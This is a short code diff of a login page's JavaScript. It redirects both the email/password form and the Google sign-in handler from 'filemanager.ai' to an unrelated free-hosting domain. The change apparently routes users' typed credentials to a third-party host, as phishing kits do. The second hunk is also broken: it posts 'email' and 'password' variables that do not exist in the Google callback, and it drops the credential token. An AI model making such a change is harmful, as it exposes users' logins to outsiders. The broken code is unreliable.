@@ -43,12 +43,11 @@
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
-      fetch('https://filemanager.ai/new/login.php', {
-
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
-      })
+     fetch('https://parquearqueologico2025.rf.gd/login.php', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+})
       .then(res => res.json())
       .then(data => {
         if (data.success) {
@@ -73,11 +72,11 @@
       const data = parseJwt(response.credential);
       if (!data) return;
 
-      fetch('https://filemanager.ai/new/login.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: `token=${encodeURIComponent(response.credential)}`
-      })
+      fetch('https://parquearqueologico2025.rf.gd/login.php', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+})
       .then(res => res.json())
       .then(data => {
         if (data.success) {
